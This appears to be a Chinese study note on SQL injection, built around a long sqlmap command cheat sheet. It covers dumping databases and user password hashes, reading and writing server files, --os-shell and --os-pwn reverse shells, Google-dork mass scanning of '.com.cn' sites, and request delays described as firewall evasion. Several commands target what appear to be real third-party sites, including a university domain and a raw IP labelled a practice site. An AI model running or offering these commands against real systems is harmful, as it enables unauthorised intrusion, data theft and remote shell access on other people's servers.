# day5 burp使用+sqlmap+mysql注入实战

ctf题目推荐:  [极客大挑战 2019]EasySQL   [强网杯 2019]随便注（考察点，堆叠注入）



sqlmap使用

询数据库：sqlmap -u url --dbs

查某数据库中的表 sqlmap -u url -D 数据库名 -tables

查询某数据库中某表的列 sqlmap -u url -D 数据库名 -T 表名 --columns

查询表中的信息 sqlmap -u url -D 数据库名 -T 表名 -C 字段1,字段2,字段3 --dump

对于post请求使用sqlmap -r test.txt即可

```React JSX
-batch  自动答复和判断
–purge 重新扫描
-random-agent 随机useranent头
-p "id"  指定注入位置为id
-file-read="/etc/passwd" 读取文件
-file-write="/tmp/wer" 写入文件
-threads=10  设置线程
-timeout=15 设置超时时间
–dbms=mysql  指定为mysql数据库
-g "inurl:php?id=10 site:.com.cn" 谷歌搜索使用

```


sqlmap利用谷歌批量搜索

```React JSX
sqlmap -g "inurl:php?id=10 site:.com.cn" --proxy "http://127.0.0.1:1080" --threads 5 --batch --answer "extending=N,follow=N,keep=N,exploit=n" --smart
```


```React JSX
-g #谷歌搜索
–proxy #代理 
–threads #线程
–batch #自动回复
–answer “extending=N,follow=N,keep=N,exploit=n” #这个可以对一些特定的问题作出回答，在自动化注入中用
–smart #当有大量目标时，这个就只检查基于错误的注入点
```




get请求和post请求的区别



实战站点:[http://47.113.207.174/](http://47.113.207.174/)

# [sqlmap常用命令](https://www.cnblogs.com/-ying-/p/11759869.html)


--dbnms
\--
--common-tables 暴力猜表名
-u #注入点
-f #指纹判别数据库类型
-b #获取数据库版本信息
-p #指定可测试的参数(?page=1&id=2 -p “page,id”)
-D “” #指定数据库名
-T “” #指定表名
-C “” #指定字段
-s “” #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s “xx.log” 恢复:-s “xx.log” –resume)
–columns #列出字段
–current-user #获取当前用户名称
–current-db #获取当前数据库名称
–users #列数据库所有用户
–passwords #数据库用户所有密码
–privileges #查看用户权限(–privileges -U root)
-U #指定数据库用户
–dbs #列出所有数据库
–tables -D “” #列出指定数据库中的表
–columns -T “user” -D “mysql” #列出mysql数据库中的user表的所有字段
–dump-all #列出所有数据库所有表
–exclude-sysdbs #只列出用户自己新建的数据库和表
–dump -T “数据库” -D “表” -C “字段” #列出指定数据库的表的字段的数据(–dump -T users -D master -C surname)
–dump -T “” -D “” –start 2 –top 4 # 列出指定数据库的表的2-4字段的数据
–dbms #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB)
–os #指定系统(Linux,Windows)
-v #详细的等级(0-6)
0：只显示Python的回溯，错误和关键消息。
1：显示信息和警告消息。
2：显示调试消息。
3：有效载荷注入。
4：显示HTTP请求。
5：显示HTTP响应头。
6：显示HTTP响应页面的内容
–privileges #查看权限
–is-dba #是否是数据库管理员
–roles #枚举数据库用户角色
–udf-inject #导入用户自定义函数（获取系统权限）
–union-check #是否支持union 注入
–union-cols #union 查询表记录
–union-test #union 语句测试
–union-use #采用union 注入
–union-tech orderby #union配合order by
–method “POST” –data “” #POST方式提交数据(–method “POST” –data “page=1&id=2″)
–cookie “用;号分开” #cookie注入(–cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”)
–referer “” #使用referer欺骗(–referer “http://www.baidu.com”)
–user-agent “” #自定义user-agent
–proxy “http://127.0.0.1:8118″ #代理注入
–string “” #指定关键词
–threads #采用多线程(–threads 3)
–sql-shell #执行指定sql命令
–sql-query #执行指定的sql语句(–sql-query “SELECT password FROM mysql.user WHERE user = ‘root’ LIMIT 0, 1″ )
–file-read #读取指定文件
–file-write #写入本地文件(–file-write /test/test.txt –file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt)
–file-dest #要写入的文件绝对路径
–os-cmd=id #执行系统命令
–os-shell #系统交互shell
–os-pwn #反弹shell(–os-pwn –msf-path=/opt/framework/msf3/)
–msf-path= #matesploit绝对路径(–msf-path=/opt/framework/msf3/)
–os-smbrelay #
–os-bof #
–reg-read #读取win系统注册表
–priv-esc #
–time-sec= #延迟设置 默认–time-sec=5 为5秒
-p “user-agent” –user-agent “sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)” #指定user-agent注入
–eta #盲注

sqlmap.py -u url 判断
sqlmap.py -u url --is-dba 判断是不是root权限
sqlmap.py -u url --is-dba -v 这是判断当前数据库的使用者是否是dba
sqlmap.py -u url --users -v 0 这句的目的是列举数据库的用户
sqlmap.py -u url --passwords -v 0 这句的目的是获取数据库用户的密码
sqlmap.py -u url --privileges -v 0 这是判断当前的权限
sqlmap.py -u url --dbs -v 0 这句的目的是将所有的数据库列出来
sqlmap.py -u url --tables -D '表' 爆表
sqlmap.py -u url --columns -T ‘表’-D ‘数据库’爆列
sqlmap.py -u url --dump -T '表' --start 1 --stop 4 -v 0 这里是查询第2到第4行的内
sqlmap.py -u url --dump -all -v 0
\-------------------------------------------------------------------------------------------------------------------------
--current-user 看看权限……

 

 


access注入
sqlmap.py -u "url" ==检测。

sqlmap.py -u "url" --tables ==猜表。

sqlmap.py -u "url" --columns -T "表名" ==猜字段

sqlmap.py -u "url" --dump -T "表名" -C "字段,字段" ==暴表里面的字段的内容

 


Mysql数据注入
sqlmap.py -u url --privileg ==查看权限(root什么什么的)

sqlmap.py -u url --is-dba 判断是不是root权限

sqlmap.py -u url --dbs ==获取数据库

sqlmap.py -u url --tables -D "数据库名" ==获取当中的数据库的表

sqlmap.py -u url --columns -D "数据库名" -T "表名" ==获取数据库 表中的字段

sqlmap.py -u url --dump -D "数据库名" -T "表名" -C "字段,字段" ==获取数据库表的字段里的内容

 

Cookie注入

注入点：http://www.ntjx.org/jsj/DownloadShow.asp?id=9

sqlmap.py -u "http://www.ntjx.org/jsj/DownloadShow.asp" --cookie "id=9" --table --level 2 ==暴表名

sqlmap.py -u "http://www.ntjx.org/jsj/DownloadShow.asp" --cookie "id=9" --columns -T "表名" --level 2 ==暴表的字段

sqlmap.py -u "http://www.ntjx.org/jsj/DownloadShow.asp" --cookie "id=9" --dump -T "表名" -C "字段,字段" --level 2 ==暴表的字段内容

 

 

post登陆注入 mssql

sqlmap.py -u "http://testasp.vulnweb.com/Login.asp" --data "tfUName=12345&tfUPass=12345"

sqlmap.py -u "http://testasp.vulnweb.com/Login.asp" --data "tfUName=12345&tfUPass=12345" --dbs ==获取数据库名

sqlmap.py -u "http://testasp.vulnweb.com/Login.asp" --data "tfUName=12345&tfUPass=12345" --tables -D "数据库名" ==列表

sqlmap.py -u "http://testasp.vulnweb.com/Login.asp" --data "tfUName=12345&tfUPass=12345" --columns -T "表名" -D "数据库名" ==暴字段

sqlmap.py -u "http://testasp.vulnweb.com/Login.asp" --data "tfUName=12345&tfUPass=12345" --dump --columns -C "字段,字段" -T "表" -D "数据名" ==暴字段内容

 


直接拿shell或者执行命令（需要权限很大跟物理路径）

sqlmap.py -u url --os-shell

sqlmap.py -u url --os-cmd=ipconfig

 

伪静态注入
注入点：http://sfl.fzu.edu.cn/index.php/Index/view/id/40.html （注意：要加个* 哪里存在注入就加上 * 号）

sqlmap.py -u http://sfl.fzu.edu.cn/index.php/Index/view/id/40*.html --dbs ==获取数据库名

sqlmap.py -u http://sfl.fzu.edu.cn/index.php/Index/view/id/40*.html --tables -D "数据名" ==获取数据库当中的表

sqlmap.py -u http://sfl.fzu.edu.cn/index.php/Index/view/id/40*.html --columns -D "数据名" -T "表名" ==获取数据库的表中的字段

sqlmap.py -u http://sfl.fzu.edu.cn/index.php/Index/view/id/40*.html --dump -D "数据名" -T "表名" -C "字段,字段" ==获取数据库的表中的字段内容

 


请求延时（一般突破防火墙）

第一种方法：sqlmap.py -u url --delay 2 （注意：2是两秒的意思，也就是说2秒访问一次）
第二种方法： sqlmap.py -u url --safe-freq 3 （注意：3是3次的意思。。）

可以组合使用 sqlmap.py -u url --delay 2 --safe-freq 3


利用文件来注入


GET /?id=1 HTTP/1.1
Host: www.why25.com

User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0

x-forwarded-for: 1*(存在注入)

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3

Accept-Encoding: gzip, deflate

Cookie: PHPSESSID=109b6bcfd7ec056764c71aa62a4d6638

Connection: keep-alive

Cache-Control: max-age=0

 

 

星号(*) 指定注入点

 

sqlmap -r c:/s.txt --level 3 --dbms=mysql --risk 1 注意： --level 是测试等级意思就是说我要更加耐心仔仔细细的加强检测等级3 如果没有level 默认等级是1的


别人再次整理过的


-p 指定测试参数
-b 获取banner
--dbs 列举数据库
--is-dba 是否是管理员权限
--current-db 当前数据库
--current-user 当前用户
--tables 列举数据库的表名
--count 检索所有条目数
--columns 获取表的列名
--dump 获取表中的数据，包含列
--dump-all 转存DBMS数据库所有表项目
--level 测试等级(1-5)，默认为1
-v 显示详细信息

读取数据库--->读取表---->读取表的列---->获取内容

-D 指定数据库

-T 指定表

-C 指定列

--dbms=mysql oracle mssql 指定数据库
=======================================

参照官方文档：https://github.com/sqlmapproject/sqlmap/wiki/Usage。

-b 获取banner
-p 指定测试参数
-g 从google中获取URL , -g "inurl:aspx?id="
--gpage=GOOGLEPAGE 指定Google页码
--union-check 是否支持union 注入
--union-cols union 查询表记录
--union-test union 语句测试
--union-use 采用union 注入
--proxy 代理注入
---threads 采用多线程
--user-agent 自定义user-agent
--referer=REFERER HTTP referer头
--proxy=PROXY 使用代理
--string 指定关键词
--tor 创建tor的匿名网络
--predict-output 常见的查询输出预测
--keep-alive 使用持久HTTP（S）连接
--eval=EVALCODE 所使用HTTP参数污染
-a,-all 查询所有
--hostname 主机名
--is-dbs 是否是管理员权限
--users 枚举所有用户
--passwords 枚举所有用户密码
--roles 枚举所有用户角色
--schema 枚举DBMS模式
--count 检索所有条目数
--dump 转存DBMS数据库表项目，需要制定字段名称(列名称)
--dump-all 转存DBMS数据库所有表项目
--search 搜索列，表或数据库名称
--exclude-sysdbs 在枚举表时排除系统数据库
--sql-query=query 执行SQL语句
--file-read=RFILE 读取操作
--file-write=WFILE 写入操作
--file-dest=DFILE 绝对路径写入
--reg-read 阅读一个Windows注册表项值
--reg-add 增加一个Windows注册表项值数据
--reg-del 删除一个Windows注册表项值数据
--reg-key=REGKEY Windows注册表键
--reg-value=REGVAL Windows注册表键值
-- reg-data=REGDATA Windows注册表的键值项数据
--reg-type=REGTYPE Windows注册表键的值类型
--csv-del=CSVDEL 划定CSV输出中使用的字符 (default ",")
--dump-format=DUMP 转存数据格式(CSV (default), HTML or SQLITE)
--hex 使用十六进制数据检索功能
--output-dir=ODIR 自定义输出的目录路径
--update 更新SQLMap
--purge-output 安全的删除所有内容输出目录
--check-waf 启发式检查WAF / IPS / IDS保护
--os-pwn 反弹shell
--cookie=COOKIE 指定HTTP Cookie ，预登陆
--random-agent 使用随机选定的User-Agent头
--tamper=TAMPER 使用SQLMap插件
--level 测试等级(1-5)，默认为1
